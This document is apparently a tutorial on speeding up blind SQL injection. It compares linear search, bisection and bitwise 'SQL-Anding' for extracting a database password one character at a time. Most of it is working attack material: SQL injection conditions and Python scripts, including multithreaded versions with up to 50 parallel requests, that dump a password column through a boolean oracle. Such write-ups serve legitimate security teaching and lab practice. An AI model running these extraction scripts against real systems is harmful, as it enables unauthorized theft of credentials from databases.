# ⚡ Optimizing Blind SQLi

## The Need for Speed

### Baseline Performance (Linear Search)

| Metric | Value |
|--------|-------|
| **Requests** | 4,128 |
| **Time** | 1,005.67 seconds (~17 min) |

We can drastically improve this with better algorithms.

---

## Algorithm 1: Bisection (Binary Search)

### How It Works

Repeatedly split the search area in half until one option remains.

**Search area**: ASCII values 0-127

### Example: Finding '-' (ASCII 45)

```
Target = '-' = 45

LBound = 0, UBound = 127
→ Midpoint = (0+127)//2 = 63
→ Is target between 0 and 63? YES
→ UBound = 63 - 1 = 62

LBound = 0, UBound = 62
→ Midpoint = (0+62)//2 = 31
→ Is target between 0 and 31? NO
→ LBound = 31 + 1 = 32

LBound = 32, UBound = 62
→ Midpoint = (32+62)//2 = 47
→ Is target between 32 and 47? YES
→ UBound = 47 - 1 = 46

LBound = 32, UBound = 46
→ Midpoint = (32+46)//2 = 39
→ Is target between 32 and 39? NO
→ LBound = 39 + 1 = 40

LBound = 40, UBound = 46
→ Midpoint = (40+46)//2 = 43
→ Is target between 40 and 43? NO
→ LBound = 43 + 1 = 44

LBound = 44, UBound = 46
→ Midpoint = (44+46)//2 = 45
→ Is target between 44 and 45? YES
→ UBound = 45 - 1 = 44

LBound = 44, UBound = 44
→ Midpoint = (44+44)//2 = 44
→ Is target between 44 and 44? NO
→ LBound = 44 + 1 = 45

✅ LBound = 45 = Target!
```

**Result**: 7 requests instead of 45!

### SQL Query

```sql
ASCII(SUBSTRING(password,1,1)) BETWEEN <LBound> AND <Midpoint>
```

### Python Implementation

```python
# Dump password using Bisection
print("[*] Password = ", end='')

for i in range(1, length + 1):
    low = 0
    high = 127
    
    while low <= high:
        mid = (low + high) // 2
        if oracle(f"ASCII(SUBSTRING(password,{i},1)) BETWEEN {low} AND {mid}"):
            high = mid - 1
        else:
            low = mid + 1
    
    print(chr(low), end='')
    sys.stdout.flush()

print()
```

### Performance

| Metric | Value |
|--------|-------|
| **Requests** | 256 |
| **Time** | 61.56 seconds |
| **Improvement** | **16x faster!** |

---

## Algorithm 2: SQL-Anding (Bitwise)

### How It Works

ASCII values 0-127 = binary `00000000` to `01111111`

Since MSB is always 0, we only need to dump **7 bits**.

### Bitwise AND Logic

```
number & bit_value > 0  →  bit is 1
number & bit_value = 0  →  bit is 0
```

### Example: Finding '9' (ASCII 57)

```
Target = '9' = 57 = 00111001 (binary)

Is (target & 1) > 0?  → YES → Bit 0 = 1  → ......1
Is (target & 2) > 0?  → NO  → Bit 1 = 0  → .....01
Is (target & 4) > 0?  → NO  → Bit 2 = 0  → ....001
Is (target & 8) > 0?  → YES → Bit 3 = 1  → ...1001
Is (target & 16) > 0? → YES → Bit 4 = 1  → ..11001
Is (target & 32) > 0? → YES → Bit 5 = 1  → .111001
Is (target & 64) > 0? → NO  → Bit 6 = 0  → 0111001

Result: 0111001 = 57 = '9' ✅
```

### SQL Query

```sql
(ASCII(SUBSTRING(password,N,1)) & X) > 0
```

Where `X` = 1, 2, 4, 8, 16, 32, 64 (powers of 2)

### Python Implementation

```python
# Dump password using SQL-Anding
print("[*] Password = ", end='')

for i in range(1, length + 1):
    c = 0
    for p in range(7):  # 7 bits needed for ASCII
        if oracle(f"ASCII(SUBSTRING(password,{i},1))&{2**p}>0"):
            c |= 2**p  # Set the bit
    
    print(chr(c), end='')
    sys.stdout.flush()

print()
```

### Performance

| Metric | Value |
|--------|-------|
| **Requests** | 256 |
| **Time** | 60.28 seconds |
| **Note** | Slightly faster due to simpler query |

---

## Performance Comparison

| Algorithm | Requests | Time | Speed Improvement |
|-----------|----------|------|-------------------|
| **Linear Search** | 4,128 | 1,005.67s | Baseline |
| **Bisection** | 256 | 61.56s | **16x faster** |
| **SQL-Anding** | 256 | 60.28s | **16.7x faster** |

---

## Further Optimization: Multithreading

### Bisection Threading

- 7 requests per character are **dependent** (sequential)
- Individual characters are **independent** (parallel)

```python
import concurrent.futures

def dump_char_bisection(position):
    low, high = 0, 127
    while low <= high:
        mid = (low + high) // 2
        if oracle(f"ASCII(SUBSTRING(password,{position},1)) BETWEEN {low} AND {mid}"):
            high = mid - 1
        else:
            low = mid + 1
    return (position, chr(low))

# Parallel extraction
with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(dump_char_bisection, i) for i in range(1, length + 1)]
    results = sorted([f.result() for f in futures])
    password = ''.join([r[1] for r in results])

print(f"[*] Password = {password}")
```

### SQL-Anding Threading

- 7 requests per character are **independent** (parallel)
- Individual characters are **independent** (parallel)
- **All requests can run in parallel!**

```python
import concurrent.futures

def check_bit(position, bit):
    if oracle(f"ASCII(SUBSTRING(password,{position},1))&{2**bit}>0"):
        return (position, bit, True)
    return (position, bit, False)

# Generate all tasks
tasks = [(i, b) for i in range(1, length + 1) for b in range(7)]

# Run all in parallel
with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    futures = [executor.submit(check_bit, pos, bit) for pos, bit in tasks]
    results = [f.result() for f in futures]

# Reconstruct password
chars = {i: 0 for i in range(1, length + 1)}
for pos, bit, is_set in results:
    if is_set:
        chars[pos] |= 2**bit

password = ''.join([chr(chars[i]) for i in range(1, length + 1)])
print(f"[*] Password = {password}")
```

---

## Algorithm Selection Guide

| Scenario | Recommended Algorithm |
|----------|----------------------|
| **Single-threaded** | SQL-Anding (slightly faster) |
| **Multi-threaded** | SQL-Anding (fully parallelizable) |
| **Limited requests** | Both equal (same request count) |
| **Simple implementation** | Bisection (easier to understand) |

---

## Quick Reference

### Bisection Query

```sql
ASCII(SUBSTRING(column,position,1)) BETWEEN low AND mid
```

### SQL-Anding Query

```sql
(ASCII(SUBSTRING(column,position,1)) & power_of_2) > 0
```

### Complexity

| Algorithm | Requests per Character |
|-----------|------------------------|
| Linear | ~64 average (0-127) |
| Bisection | 7 (log₂ 128) |
| SQL-Anding | 7 (7 bits) |

---

## References

- [Advanced Blind SQL Injection Techniques](https://www.youtube.com/watch?v=example)
- [Binary Search Algorithm](https://en.wikipedia.org/wiki/Binary_search_algorithm)
- [Bitwise Operations](https://en.wikipedia.org/wiki/Bitwise_operation)

